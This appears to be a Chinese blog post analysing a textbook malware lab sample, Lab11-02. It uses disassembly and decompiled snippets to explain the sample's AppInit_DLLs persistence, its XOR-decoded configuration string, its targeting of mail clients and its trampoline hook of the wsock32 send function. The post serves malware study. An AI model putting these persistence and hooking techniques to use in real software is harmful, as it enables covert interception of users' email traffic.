+<h1 id="Lab11-02"><a href="#Lab11-02" class="headerlink" title="Lab11-02"></a>Lab11-02</h1><h2 id="简要分析-1"><a href="#简要分析-1" class="headerlink" title="简要分析"></a>简要分析</h2><p>dll的只有一个导出函数<code>installer</code>，该函数首先设施一个注册表的值SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_Dlls\spoolvxx32.dll，AppInit_Dlls注册表表明当系统使用User32.dll时加载的内容，所以当调用User32.dll时也会加载spoolvxx32.dll：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001594</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; phkResult</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001595</span>                 <span class="keyword">push</span>    <span class="number">6</span>               <span class="comment">; samDesired</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001597</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; ulOptions</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001599</span>                 <span class="keyword">push</span>    offset SubKey   <span class="comment">; "SOFTWARE\\Microsoft\\Windows NT\\Curren"...</span></span><br><span class="line"><span class="symbol">.text:</span>1000159E                 <span class="keyword">push</span>    <span class="number">80000002h</span>       <span class="comment">; hKey</span></span><br><span class="line"><span class="symbol">.text:</span>100015A3                 <span class="keyword">call</span>    <span class="built_in">ds</span>:RegOpenKeyExA</span><br><span class="line"><span class="symbol">.text:</span>100015A9                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>100015AB                 <span class="keyword">jnz</span>     short loc_100015DD</span><br><span class="line"><span class="symbol">.text:</span>100015AD                 <span class="keyword">push</span>    offset aSpoolvxx32Dll <span class="comment">; "spoolvxx32.dll"</span></span><br><span class="line"><span class="symbol">.text:</span>100015B2                 <span class="keyword">call</span>    strlen</span><br><span class="line"><span class="symbol">.text:</span>100015B7                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>100015BA                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; cbData</span></span><br><span class="line"><span class="symbol">.text:</span>100015BB                 <span class="keyword">push</span>    offset Data     <span class="comment">; "spoolvxx32.dll"</span></span><br><span class="line"><span class="symbol">.text:</span>100015C0                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; dwType</span></span><br><span class="line"><span class="symbol">.text:</span>100015C2                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; Reserved</span></span><br><span class="line"><span class="symbol">.text:</span>100015C4                 <span class="keyword">push</span>    offset ValueName <span class="comment">; "AppInit_DLLs"</span></span><br><span class="line"><span class="symbol">.text:</span>100015C9                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+phkResult]</span><br><span class="line"><span class="symbol">.text:</span>100015CC                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; hKey</span></span><br><span class="line"><span class="symbol">.text:</span>100015CD                 <span class="keyword">call</span>    <span class="built_in">ds</span>:RegSetValueExA</span><br><span class="line"><span class="symbol">.text:</span>100015D3                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+phkResult]</span><br><span class="line"><span class="symbol">.text:</span>100015D6                 <span class="keyword">push</span>    <span class="built_in">edx</span>             <span class="comment">; hKey</span></span><br><span class="line"><span class="symbol">.text:</span>100015D7                 <span class="keyword">call</span>    <span class="built_in">ds</span>:RegCloseKey</span><br></pre></td></tr></table></figure>
+
+<p>然后将spoolvxx32.dll写入到系统目录中：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>100015<span class="built_in">DD</span>                 <span class="keyword">call</span>    get_sys_dir_1000105B</span><br><span class="line"><span class="symbol">.text:</span>100015E2                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+Dest], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>100015E5                 <span class="keyword">push</span>    <span class="number">104h</span>            <span class="comment">; Count</span></span><br><span class="line"><span class="symbol">.text:</span>100015EA                 <span class="keyword">push</span>    offset aSpoolvxx32Dll_1 <span class="comment">; "\\spoolvxx32.dll"</span></span><br><span class="line"><span class="symbol">.text:</span>100015EF                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span>100015F2                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Dest</span></span><br><span class="line"><span class="symbol">.text:</span>100015F3                 <span class="keyword">call</span>    strncat</span><br><span class="line"><span class="symbol">.text:</span>100015F8                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span>100015FB                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; bFailIfExists</span></span><br><span class="line"><span class="symbol">.text:</span>100015FD                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001600</span>                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; lpNewFileName</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001601</span>                 <span class="keyword">push</span>    offset ExistingFileName <span class="comment">; lpExistingFileName</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001606</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CopyFileA</span><br></pre></td></tr></table></figure>
+
+<p><code>DllMain</code>首先判断dll状态是否为DLL_PROCESS_ATTACH：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001610</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001611</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001613</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001616</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+hinstDLL]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001619</span>                 <span class="keyword">mov</span>     dword_100035A4, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>1000161E                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+fdwReason], DLL_PROCESS_ATTACH</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001622</span>                 <span class="keyword">jz</span>      short loc_10001629</span><br></pre></td></tr></table></figure>
+
+<p>然后在系统目录中打开Lab11-02.ini文件并读取到<code>byte_100034A0</code>：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001651</span>                 <span class="keyword">call</span>    get_sys_dir_1000105B</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001656</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+Dest], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001659</span>                 <span class="keyword">push</span>    <span class="number">104h</span>            <span class="comment">; Count</span></span><br><span class="line"><span class="symbol">.text:</span>1000165E                 <span class="keyword">push</span>    offset aLab1102Ini <span class="comment">; "\\Lab11-02.ini"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001663</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001666</span>                 <span class="keyword">push</span>    <span class="built_in">edx</span>             <span class="comment">; Dest</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001667</span>                 <span class="keyword">call</span>    strncat</span><br><span class="line"><span class="symbol">.text:</span>1000166C                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span>1000166F                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; hTemplateFile</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001671</span>                 <span class="keyword">push</span>    <span class="number">80h</span>             <span class="comment">; dwFlagsAndAttributes</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001676</span>                 <span class="keyword">push</span>    <span class="number">3</span>               <span class="comment">; dwCreationDisposition</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001678</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpSecurityAttributes</span></span><br><span class="line"><span class="symbol">.text:</span>1000167A                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; dwShareMode</span></span><br><span class="line"><span class="symbol">.text:</span>1000167C                 <span class="keyword">push</span>    <span class="number">80000000h</span>       <span class="comment">; dwDesiredAccess</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001681</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001684</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; lpFileName</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001685</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateFileA</span><br><span class="line"><span class="symbol">.text:</span>1000168B                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+hFile], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>1000168E                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+hFile], <span class="number">0FFFFFFFFh</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001692</span>                 <span class="keyword">jz</span>      short loc_100016DE</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001694</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+NumberOfBytesRead], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>1000169B                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpOverlapped</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1000169D</span>                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+NumberOfBytesRead]</span><br><span class="line"><span class="symbol">.text:</span>100016A0                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; lpNumberOfBytesRead</span></span><br><span class="line"><span class="symbol">.text:</span>100016A1                 <span class="keyword">push</span>    <span class="number">100h</span>            <span class="comment">; nNumberOfBytesToRead</span></span><br><span class="line"><span class="symbol">.text:</span>100016A6                 <span class="keyword">push</span>    offset byte_100034A0 <span class="comment">; lpBuffer</span></span><br><span class="line"><span class="symbol">.text:</span>100016AB                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+hFile]</span><br><span class="line"><span class="symbol">.text:</span>100016AE                 <span class="keyword">push</span>    <span class="built_in">edx</span>             <span class="comment">; hFile</span></span><br><span class="line"><span class="symbol">.text:</span>100016AF                 <span class="keyword">call</span>    <span class="built_in">ds</span>:ReadFile</span><br></pre></td></tr></table></figure>
+
+<p>将读取的内容进行处理：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>100016C5                 <span class="keyword">push</span>    offset byte_100034A0</span><br><span class="line"><span class="symbol">.text:</span>100016CA                 <span class="keyword">call</span>    sub_100010B3</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_100010B3</code>函数将读取的内容中除了换行符和制表符的字符使用<code>sub_10001097</code>进行处理：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_100010B3</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  <span class="keyword">while</span> ( *a1 &amp;&amp; *a1 != <span class="string">'\r'</span> &amp;&amp; *a1 != <span class="string">'\n'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = sub_10001097(*a1, <span class="number">50</span>);</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>sub_10001097</code>将读取的内容进行数学运算：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_10001097</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">unsigned</span> __int8 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 ^ (<span class="number">666</span> * a2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将Lab11-02.ini中的内容按照上述逻辑解密得出”<a href="mailto:billy@malwareanalysisbook.com" target="_blank" rel="noopener">billy@malwareanalysisbook.com</a>“： </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> a1,<span class="keyword">int</span> a2)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a1 ^ (<span class="number">666</span> * a2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *ptr = <span class="string">"CHMMXaL@MV@SD@O@MXRHRCNNJBNL"</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ptr); ++i) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; test(ptr[i], <span class="number">0x32</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/07/lab11/dbg3.JPG" alt></p>
+<p><code>DllMain</code>最后调用<code>sub_100014B6(1)</code>：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>100016E0 loc_100016E0:                           <span class="comment">; CODE XREF: DllMain(x,x,x)+CC↑j</span></span><br><span class="line"><span class="symbol">.text:</span>100016E0                 <span class="keyword">push</span>    <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>100016E2                 <span class="keyword">call</span>    sub_100014B6</span><br><span class="line"><span class="symbol">.text:</span>100016E7                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p><code>sub_100014B6</code>首先进行获取进程名并进行比较，不符合则退出：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GetModuleFileName_10001075(<span class="number">0</span>, &amp;Buf1);</span><br><span class="line">Buf1 = first92_10001104(Buf1);</span><br><span class="line">...........</span><br><span class="line">capslk_1000102D(Buf1);</span><br><span class="line">v2 = <span class="built_in">strlen</span>(aThebatExe);                  <span class="comment">// THEBAT.EXE</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(Buf1, aThebatExe_0, v2)      <span class="comment">// THEBAT.EXE</span></span><br><span class="line">        || (v3 = <span class="built_in">strlen</span>(aOutlookExe), !<span class="built_in">memcmp</span>(Buf1, aOutlookExe_0, v3))</span><br><span class="line">        || (v4 = <span class="built_in">strlen</span>(aMsimnExe), !<span class="built_in">memcmp</span>(Buf1, aMsimnExe_0, v4)) )</span><br><span class="line">    &#123;</span><br><span class="line">        .........</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>判读成功首先挂起所有线程：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001555</span>                 <span class="keyword">call</span>    memcmp</span><br><span class="line"><span class="symbol">.text:</span>1000155A                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">1000155D</span>                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>1000155F                 <span class="keyword">jnz</span>     short loc_10001587</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001561</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001561</span> loc_10001561:                           <span class="comment">; CODE XREF: hook_installer_100014B6+63↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001561</span>                                         <span class="comment">; hook_installer_100014B6+86↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001561</span>                 <span class="keyword">call</span>    suspend_thread_100013BD</span><br><span class="line"><span class="symbol">                                .text:</span>100013BD                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013BE                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013C0                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013C1                 <span class="keyword">call</span>    <span class="built_in">ds</span>:GetCurrentProcessId</span><br><span class="line"><span class="symbol">                                .text:</span>100013C7                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013CA                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="symbol">                                .text:</span>100013CD                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013CE                 <span class="keyword">call</span>    suspend_thread_100012FE</span><br><span class="line"><span class="symbol">                                .text:</span>100013D3                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013D6                 <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013D8                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">                                .text:</span>100013D9                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>
+
+<p>然后进行<code>send</code>函数的hook。</p>
+<p>首先获得wsock32.dll的句柄：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = GetModuleHandleA(wsock32);</span><br><span class="line">hModule = result;</span><br></pre></td></tr></table></figure>
+
+<p>获取成功获得地址并进行hook：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = GetProcAddress(wsock32_Module, send);</span><br><span class="line"><span class="keyword">if</span> ( result )</span><br><span class="line">      result = hook_10001203(result, a3, a4);</span><br></pre></td></tr></table></figure>
+
+<p>hook的函数首先计算<code>send</code>函数与<code>sub_1000113D</code>函数的距离，这里的5个字节作覆盖<code>send</code>的内容：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001203</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001204</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001206</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001209</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>1000120C                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+send_addr]</span><br><span class="line"><span class="symbol">.text:</span>1000120F                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001212</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+gap], <span class="built_in">eax</span></span><br></pre></td></tr></table></figure>
+
+<p>修改内存的读写执行权限：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001220</span>                 <span class="keyword">push</span>    <span class="built_in">edx</span>             <span class="comment">; lpAddress</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001221</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:VirtualProtect</span><br></pre></td></tr></table></figure>
+
+<p>分配0xFF内存作为跳板：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001227</span>                 <span class="keyword">push</span>    <span class="number">0FFh</span>            <span class="comment">; Size</span></span><br><span class="line"><span class="symbol">.text:</span>1000122C                 <span class="keyword">call</span>    malloc</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001231</span>                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001234</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+trampoline], <span class="built_in">eax</span></span><br></pre></td></tr></table></figure>
+
+<p>复制5字节指令到跳板中：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001246</span>                 <span class="keyword">push</span>    <span class="number">5</span>               <span class="comment">; Size</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001248</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+send_addr]</span><br><span class="line"><span class="symbol">.text:</span>1000124B                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Src</span></span><br><span class="line"><span class="symbol">.text:</span>1000124C                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+trampoline]</span><br><span class="line"><span class="symbol">.text:</span>1000124F                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001252</span>                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; Dst</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001253</span>                 <span class="keyword">call</span>    memcpy<span class="string">`</span></span><br></pre></td></tr></table></figure>
+
+<p>添加<code>jmp</code>指令：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001258</span>                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span>1000125B                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+trampoline]</span><br><span class="line"><span class="symbol">.text:</span>1000125E                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>+<span class="number">0Ah</span>], <span class="number">0E9h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001262</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+send_addr]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001265</span>                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+trampoline]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001268</span>                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>1000126B                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+trampoline]</span><br><span class="line"><span class="symbol">.text:</span>1000126E                 <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">0Bh</span>], <span class="built_in">eax</span></span><br></pre></td></tr></table></figure>
+
+<p>最后将跳板地址给传入的参数：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>1000129A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_8]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1000129D</span>                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>1000129F                 <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br></pre></td></tr></table></figure>
+
